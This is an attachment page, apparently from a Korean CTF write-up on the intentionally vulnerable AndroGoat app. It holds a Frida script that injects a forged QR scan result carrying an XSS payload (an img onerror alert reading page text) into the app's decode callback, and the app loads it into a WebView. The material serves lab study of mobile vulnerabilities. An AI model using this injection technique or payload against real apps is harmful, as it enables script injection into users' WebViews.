---
{"title":"inject-qr-result.js","date":"2026-11-12","category":"ctf","tags":["AndroGoat","첨부파일","증거"],"summary":"frida/inject-qr-result.js · 사용한 Frida 스크립트 — AndroGoat 라이트업 증거 원본.","section":["AndroGoat","첨부파일"]}
---

> 이 문서는 [AndroGoat 라이트업](/posts/2026-11-12-androgoat.html)의 실측 증거 원본이다. 원본 경로 `frida/inject-qr-result.js` · 사용한 Frida 스크립트.

<pre><code>// QR 스캐너가 읽었다고 가정한 문자열을 앱의 DecodeCallback 에 직접 전달 (에뮬레이터 카메라 대체)
// 앱 코드: codeScanner.decodeCallback = DecodeCallback { ... &quot;&lt;b&gt;$scannedText&lt;/b&gt;&quot; ... webView.loadData(...) }
var PAYLOAD = &quot;&lt;img src=x onerror=\&quot;alert(&#x27;QR XSS: &#x27; + document.body.innerText.substring(0,40))\&quot;&gt;&quot;;

Java.perform(function () {
    var Result = Java.use(&quot;com.google.zxing.Result&quot;);
    var Format = Java.use(&quot;com.google.zxing.BarcodeFormat&quot;);
    Java.choose(&quot;owasp.sat.agoat.QRCodeXSSActivity&quot;, {
        onMatch: function (act) {
            var scanner = act.codeScanner.value;
            var cb = scanner.getDecodeCallback();
            var res = Result.$new(PAYLOAD, null, null, Format.QR_CODE.value);
            console.log(&quot;[*] QR 스캔 결과 주입: &quot; + PAYLOAD);
            cb.onDecoded(res);
        },
        onComplete: function () { console.log(&quot;[*] done&quot;); }
    });
});
</code></pre>

[← 본문으로 돌아가기](/posts/2026-11-12-androgoat.html)
